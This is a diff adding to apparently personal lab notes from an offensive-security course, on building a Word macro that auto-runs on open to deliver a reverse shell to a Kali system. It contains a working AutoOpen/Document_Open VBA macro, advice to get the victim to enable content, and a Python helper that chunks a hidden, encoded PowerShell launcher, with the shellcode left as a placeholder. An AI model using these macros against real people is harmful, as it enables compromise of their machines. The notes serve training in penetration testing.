@@ -50,7 +50,45 @@ Upon clicking "Run" we recieve our connection.
 #### Exercises
 **1. Use the PowerShell payload from the HTA attack to create a Word macro that sends a reverse shell to your Kali system.**
 
+To start, we need to create a framework for our Microsoft Word macro. We use the following code as that framework:
+```
+Sub AutoOpen()
 
+  MyMacro
+  
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+  
+End Sub
+
+Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "cmd"
+  
+End Sub
+
+```
+This includes the AutoOpen and Document_Open procedures, which will cause the macro to run automatically.
+
+Upon reopening the document, we see that a warning is present warning that macros are enabled.
+![[Pasted image 20220715175358.png]]
+
+Once the victim clicks "Enable Content" our PoC macro executes and we see cmd.exe.
+![[Pasted image 20220715175549.png]]
+
+From here we are going to turn to Powershell in order to reuse our Metasploit shellcode. We first declare a variable called "Str".  From there we need to set our variable to the base64 encoded string of the shellcode. As VBA has a 255 character limit for strings we can split the command into multiple lines before concatenated them. To do this we will use the following python code.
+
+```
+str = "powershell.exe -nop -w hidden -e BASE64_ENCODED_SHELL....."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
+```
 
 # 13.3.5 Object Linking and Embedding
 #### Exercises
